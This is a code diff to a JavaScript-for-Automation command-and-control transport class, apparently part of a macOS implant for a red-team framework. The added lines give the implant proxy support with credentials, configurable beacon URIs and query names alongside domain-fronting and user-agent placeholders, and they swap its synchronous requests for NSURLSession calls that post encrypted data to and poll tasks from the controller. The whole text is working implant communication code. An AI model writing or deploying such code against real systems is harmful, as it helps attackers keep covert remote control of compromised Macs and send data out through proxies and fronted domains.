@@ -17,6 +17,31 @@ class customC2 extends baseC2{
 		}
 		this.commands = [];
 		this.url = this.baseurl;
+		this.getURI = "get_uri";
+		this.postURI = "post_uri";
+		this.queryPathName = "query_path_name";
+		this.proxyURL = "proxy_url";
+		this.proxyPort = "proxy_port";
+		this.proxyUser = "proxy_user";
+		this.proxyPassword = "proxy_pass";
+		this.proxy_dict = {};
+		if(this.proxyURL !== ""){
+			if(this.proxyURL.includes("https")) {
+				this.proxy_dict["HTTPSEnable"] = 1;
+				this.proxy_dict["HTTPSProxy"] = this.proxyURL;
+				this.proxy_dict["HTTPSPort"] = parseInt(this.proxyPort);
+			}else{
+				this.proxy_dict["HTTPEnable"] = 1;
+				this.proxy_dict["HTTPProxy"] = this.proxyURL;
+				this.proxy_dict["HTTPPort"] = parseInt(this.proxyPort);
+			}
+		}
+		if(this.proxyUser !== ""){
+			this.proxy_dict["kCFProxyUsernameKey"] = this.proxyUser;
+		}
+		if(this.proxyPassword !== ""){
+			this.proxy_dict["kCFProxyPasswordKey"] = this.proxyPassword;
+		}
 		this.jitter = callback_jitter;
 		this.host_header = "domain_front";
 		this.user_agent = "USER_AGENT";
@@ -246,6 +271,7 @@ class customC2 extends baseC2{
 	}
 	htmlPostData(sendData, uid, json=true){
 	    let url = this.baseurl;
+	    if(this.postURI !== ""){ url += "/" + this.postURI;}
         //console.log(url);
         //encrypt our information before sending it
 		let data;
@@ -279,7 +305,18 @@ class customC2 extends baseC2{
 				req.setHTTPBody(postData);
 				let response = Ref();
 				let error = Ref();
-				let responseData = $.NSURLConnection.sendSynchronousRequestReturningResponseError(req,response,error);
+				let session_config = $.NSURLSessionConfiguration.ephemeralSessionConfiguration;
+				session_config.connectionProxyDictionary = $(this.proxy_dict);
+                let session = $.NSURLSession.sessionWithConfiguration(session_config);
+				let finished = false;
+				let responseData;
+				session.dataTaskWithRequestCompletionHandler(req, (data, resp) => {
+					finished = true;
+					responseData = data;
+				}).resume;
+				while(!finished){
+					delay(0.1);
+				}
 				//responseData is base64(UUID + data)
 				if( responseData.length < 36){
 					$.NSThread.sleepForTimeInterval(this.gen_sleep_time());
@@ -324,7 +361,9 @@ class customC2 extends baseC2{
 		}
 		let NSCharacterSet = $.NSCharacterSet.characterSetWithCharactersInString("/+=\n").invertedSet;
 		data = $(data).stringByAddingPercentEncodingWithAllowedCharacters(NSCharacterSet).js;
-		let url = this.baseurl + "?q=" + data;
+		let url = this.baseurl;
+		if(this.getURI !== ""){ url += "/" + this.getURI; }
+		url += "?" + this.queryPathName + "=" + data;
 	    while(true){
 	        try{
 	        	if( $.NSDate.date.compare(this.kill_date) === $.NSOrderedDescending ){
@@ -341,7 +380,18 @@ class customC2 extends baseC2{
 				}
                 let response = Ref();
                 let error = Ref();
-                let responseData = $.NSURLConnection.sendSynchronousRequestReturningResponseError(req,response,error);
+                let session_config = $.NSURLSessionConfiguration.ephemeralSessionConfiguration;
+				session_config.connectionProxyDictionary = $(this.proxy_dict);
+                let session = $.NSURLSession.sessionWithConfiguration(session_config);
+				let finished = false;
+				let responseData;
+				session.dataTaskWithRequestCompletionHandler(req, (data, resp) => {
+					finished = true;
+					responseData = data;
+				}).resume;
+				while(!finished){
+					delay(0.1);
+				}
 				if(responseData.length < 36){
                     //this means we likely got back some form of error or redirect message, not our actual data
                     $.NSThread.sleepForTimeInterval(this.gen_sleep_time());
